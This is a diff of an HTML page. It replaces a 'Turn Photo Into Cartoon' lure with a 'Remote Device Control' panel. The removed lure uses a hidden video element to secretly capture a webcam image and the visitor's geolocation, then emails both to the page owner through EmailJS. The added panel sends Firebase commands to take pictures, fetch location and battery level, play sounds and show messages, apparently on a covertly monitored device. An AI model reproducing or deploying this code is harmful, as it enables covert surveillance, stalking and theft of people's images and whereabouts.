@@ -1,71 +1,48 @@
-
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-  <title>Turn Photo Into Cartoon </title>
+  <title>Remote Control Panel</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <script src="firebase-config.js"></script>
+  <style>
+    body { font-family: Arial; padding: 20px; }
+    button { padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; }
+    input { padding: 5px; font-size: 16px; width: 300px; }
+  </style>
 </head>
 <body>
-  <h2>Choose an Option</h2>
-  <button onclick="sendLocationOnly()">Check Your Location </button>
-  <button onclick="captureAndSend()">Take Cartoon Photo </button>
+  <h2>Remote Device Control</h2>
 
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <button onclick="sendCommand('take_picture')">Take Picture with Location</button><br>
+  <button onclick="sendCommand('get_location')">Get Location</button><br>
+  <button onclick="sendCommand('get_battery')">Get Battery Level</button><br>
+  <button onclick="sendCommand('play_sound')">Play Sound</button><br>
 
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <h3>Show Message on Device</h3>
+  <input type="text" id="messageText" placeholder="Type your message here" />
+  <button onclick="sendMessage()">Send Message</button>
+
   <script>
-    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your EmailJS public key
-
-    // Location Only
-    function sendLocationOnly() {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-
-        emailjs.send("service_gkkpt4w", "template_96dsagv", {
-          message: message,
-          image: '' // Send blank image so it doesn’t break
-        })
-        .then(res => console.log("Location Found!", res))
-        .catch(err => console.error("Email failed", err));
-      }, function(error) {
-        alert("Could not get location.");
-        console.error(error);
-      });
+    function sendCommand(action) {
+      firebase.database().ref("command").set({ action });
+      alert(`Command sent: ${action}`);
     }
 
-    // Picture + Location
-    async function captureAndSend() {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
-
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      video.srcObject = stream;
-
-      await new Promise(resolve => setTimeout(resolve, 1500));
-
-      canvas.width = 160;
-      canvas.height = 120;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageBase64 = canvas.toDataURL("image/png");
-
-      stream.getTracks().forEach(track => track.stop());
-
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-
-        emailjs.send("service_gkkpt4w", "template_96dsagv", {
-          message: message,
-          image: imageBase64
-
-        })
-        .then(res => console.log("Photo and location Captured!", res))
-        .catch(err => console.error("Email failed", err));
-      }, function(error) {
-        alert("Could not get location.");
-        console.error(error);
-      });
+    function sendMessage() {
+      const msg = document.getElementById("messageText").value.trim();
+      if (msg) {
+        firebase.database().ref("command").set({
+          action: "show_message",
+          text: msg
+        });
+        alert("Message sent!");
+      } else {
+        alert("Please enter a message");
+      }
     }
   </script>
 </body>
 </html>
+
+   
